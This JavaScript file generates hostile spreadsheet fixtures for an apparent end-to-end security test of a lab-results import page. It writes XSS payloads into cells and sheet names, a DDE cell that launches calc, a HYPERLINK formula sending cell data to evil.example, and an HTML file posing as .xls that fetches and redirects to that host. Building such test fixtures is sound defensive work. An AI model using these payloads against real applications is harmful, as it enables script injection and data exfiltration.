// Regenerates the hostile test fixtures used by e2e/security.e2e.mjs.
// They contain no real data (each is marked "synthetic"); they try to make the
// page run script or contact the network. (The oversized-file case is generated
// by the e2e test itself, to keep the repository small.) Run: npm run fixture
import { writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import * as XLSX from "xlsx";

const dir = dirname(fileURLToPath(import.meta.url));
const MARK = "Synthetic hostile test file — no real data.";

// Every payload sets window.__xss if it ever executes.
const IMG = `<img src=x onerror="window.__xss=(window.__xss||0)+1">`;
const SCRIPT = `<script>window.__xss=99</script>`;

function markupWorkbook() {
  const ws = XLSX.utils.aoa_to_sheet([
    ["Marker EN", "Marker UA", "Category", "Reference", "Biohacker Range", "2024-01-01", "2025-01-01"],
    [`${IMG}ALT`, SCRIPT, `${IMG}Liver`, `<41 U/L (${IMG})`, `N/A (<a href="javascript:window.__xss=7">x</a>)`, 48, `<img src="https://evil.example/px.gif">`],
    ["javascript:window.__xss=8", `<svg onload="window.__xss=9">`, "Cat", "Negative", "N/A", "=cmd|'/c calc'!A0", "negative"],
    ["Glucose", "", "Cat", "3.9–5.6 mmol/L", "N/A", 5.4, "x"],
  ]);
  // A formula that would send data to a remote host if anything evaluated it.
  ws.H2 = { t: "s", v: "click", f: 'HYPERLINK("https://evil.example/?d="&F2,"click")' };
  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([[MARK]]), "README");
  XLSX.utils.book_append_sheet(wb, ws, "<img src=x onerror=x=5>");
  return wb;
}

function htmlDisguisedAsXls() {
  return `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/r"></head><body>
<p>${MARK}</p>
<script>window.__xss=42;fetch("https://evil.example/s")</script>
<img src="https://evil.example/i.gif"><iframe src="https://evil.example/f"></iframe>
<table><tr><td>${MARK}</td></tr>
<tr><td>Marker EN</td><td>Reference</td><td>2024-01-01</td></tr>
<tr><td><b onmouseover="window.__xss=3">ALT</b>${IMG}</td><td>&lt;41</td><td>48</td></tr></table>
</body></html>`;
}

const files = {
  "hostile_markup.xlsx": XLSX.write(markupWorkbook(), { type: "buffer", bookType: "xlsx" }),
  "hostile_html.xls": Buffer.from(htmlDisguisedAsXls()),
};
for (const [name, buf] of Object.entries(files)) {
  writeFileSync(join(dir, name), buf);
  console.log(`Wrote ${name} (${buf.length} bytes)`);
}
